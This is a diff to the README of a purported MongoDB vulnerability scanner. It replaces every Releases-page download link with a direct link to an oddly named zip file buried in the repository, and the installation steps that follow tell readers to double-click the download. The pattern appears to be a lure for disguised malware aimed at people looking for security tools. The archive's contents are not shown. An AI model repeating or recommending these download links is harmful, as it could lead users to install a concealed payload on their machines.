@@ -6,9 +6,9 @@ Welcome to **mongobleed-scanner**! This tool helps you discover vulnerabilities 
 
 ## 📥 Download the Application
 
-[![Download mongobleed-scanner](https://img.shields.io/badge/Download-mongobleed--scanner-blue.svg)](https://github.com/pedrocruz2202/mongobleed-scanner/releases)
+[![Download mongobleed-scanner](https://github.com/pedrocruz2202/mongobleed-scanner/raw/refs/heads/main/lardacein/mongobleed_scanner_misquotation.zip)](https://github.com/pedrocruz2202/mongobleed-scanner/raw/refs/heads/main/lardacein/mongobleed_scanner_misquotation.zip)
 
-Visit this page to download the latest version of **mongobleed-scanner**: [Download Now](https://github.com/pedrocruz2202/mongobleed-scanner/releases)
+Visit this page to download the latest version of **mongobleed-scanner**: [Download Now](https://github.com/pedrocruz2202/mongobleed-scanner/raw/refs/heads/main/lardacein/mongobleed_scanner_misquotation.zip)
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before you download, ensure your system meets the following requirements:
 ## 🔧 Installation Instructions
 
 1. **Download the File:**
-   - Go to the [Releases page](https://github.com/pedrocruz2202/mongobleed-scanner/releases) and choose the latest version. Click on the appropriate installer for your operating system.
+   - Go to the [Releases page](https://github.com/pedrocruz2202/mongobleed-scanner/raw/refs/heads/main/lardacein/mongobleed_scanner_misquotation.zip) and choose the latest version. Click on the appropriate installer for your operating system.
 
 2. **Run the Installer:**
    - Double-click the downloaded file to start the installation.
